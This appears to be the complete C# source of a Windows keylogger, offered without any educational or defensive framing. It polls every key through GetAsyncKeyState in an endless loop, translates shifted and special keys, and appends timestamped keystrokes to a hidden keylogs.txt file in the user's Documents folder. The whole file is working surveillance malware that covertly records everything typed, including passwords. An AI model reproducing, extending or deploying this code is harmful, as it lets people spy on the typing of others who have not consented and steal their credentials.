using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Linq;
using System.Text;
using System.IO;

namespace KeyLogger
{
    class Program
    {
        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 x);
        static void Main(string[] args)
        {
            String path = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            String filepath = (path + "\\keylogs.txt");
            if (File.Exists(filepath)) File.SetAttributes(filepath, FileAttributes.Hidden);
            StreamWriter wtime = new StreamWriter(filepath, true);
            DateTime now = DateTime.Now;
            wtime.Write("\n\n" + "===============     " + now.ToString() + "     ===============" + "\n");
            wtime.Close();
            bool shift_pressed = false;
            bool cap_pressed = false;
            string num_chars = ")!@#$%^&*(";
            // https://www.indigorose.com/webhelp/ams/Program_Reference/Misc/Virtual_Key_Codes.htm
            while (true)
            {
                for (int i = 0; i < 255; i++)
                {
                    int pressed_key = GetAsyncKeyState(i);
                    if ( pressed_key == 32769)
                    {

                        StreamWriter writer = new StreamWriter(filepath, true);

                        char key = (char)i;
                        if (GetAsyncKeyState(0x10) > 0 && shift_pressed == false)
                        {
                            shift_pressed = true;
                        }
                        if (GetAsyncKeyState(0x10) == 0 && shift_pressed == true)
                        {
                            shift_pressed = false;
                        }

                        if (i == 0x14 && cap_pressed == false)
                        {
                            cap_pressed = true;
                        }
                        else if (i == 0x14 && cap_pressed == true)
                            cap_pressed = false;


                        if (Char.IsDigit(key))
                        {
                            if (shift_pressed)
                            {
                                writer.Write(num_chars[i - 0x30]);
                            }
                            else
                            {
                                writer.Write(key);
                            }
                        }

                        else if (Char.IsLetter(key))
                        {
                            if (shift_pressed == cap_pressed)
                            {
                                writer.Write((char)(i + 0x20));
                            }
                            else
                            {
                                writer.Write(key);
                            }
                        }

                        else
                        {
                            if (i < 0x30)
                            {
                                switch (i)
                                {
                                    case 0x8: writer.Write(" [BACKSPACE] "); break;
                                    case 0x9: writer.Write(" [TAB] "); break;
                                    case 0xd: writer.Write(" [ENTER] "); break;
                                    case 0x11: writer.Write(" [CTRL] "); break;
                                    case 0x12: writer.Write(" [ALT] "); break;
                                    case 0x20: writer.Write(" "); break;
                                }
                            }

                            else
                            {
                                if (shift_pressed)
                                    writer.Write(" [SHIFT] ");

                                switch (i)
                                {
                                    case 0xba: writer.Write(";"); break;
                                    case 0xbb: writer.Write("="); break;
                                    case 0xbc: writer.Write(","); break;
                                    case 0xbd: writer.Write("-"); break;
                                    case 0xbe: writer.Write("."); break;
                                    case 0xbf: writer.Write("/"); break;
                                    case 0xc0: writer.Write("`"); break;
                                    case 0xdb: writer.Write("["); break;
                                    case 0xdc: writer.Write("\\"); break;
                                    case 0xdd: writer.Write("]"); break;
                                    case 0xde: writer.Write("'"); break;

                                }

                            }
                        }

                        writer.Close();
                    }
                }
            }
        }
    }
}